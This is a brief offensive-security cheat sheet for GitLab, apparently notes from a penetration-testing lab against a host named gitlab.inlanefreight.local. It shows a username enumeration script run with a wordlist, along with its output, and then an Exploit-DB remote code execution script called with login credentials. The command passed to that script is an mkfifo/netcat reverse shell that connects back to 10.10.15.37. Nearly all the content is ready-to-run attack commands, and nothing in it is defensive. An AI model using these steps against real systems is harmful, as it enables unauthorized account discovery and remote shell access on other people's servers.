# GitLab

## [Username Enumeration](https://github.com/dpgg101/GitLabUserEnum)

```sh
my@attack:~$ gitlab_userenum.py -u "http://gitlab.inlanefreight.local:8081" -w /usr/local/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt
```

```output title="Output"
GitLab User Enumeration in python
[+] The username DEMO exists!
[+] The username Demo exists!
[+] The username ROOT exists!
[+] The username demo exists!
[+] The username root exists!
```

## [RCE](https://www.exploit-db.com/exploits/49951)

```sh
my@attack:~$ python3 49951.py -t 'http://gitlab.inlanefreight.local:8081' -u 'hacker' -p 'P@ssw0rd' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.37 8443 >/tmp/f'
```
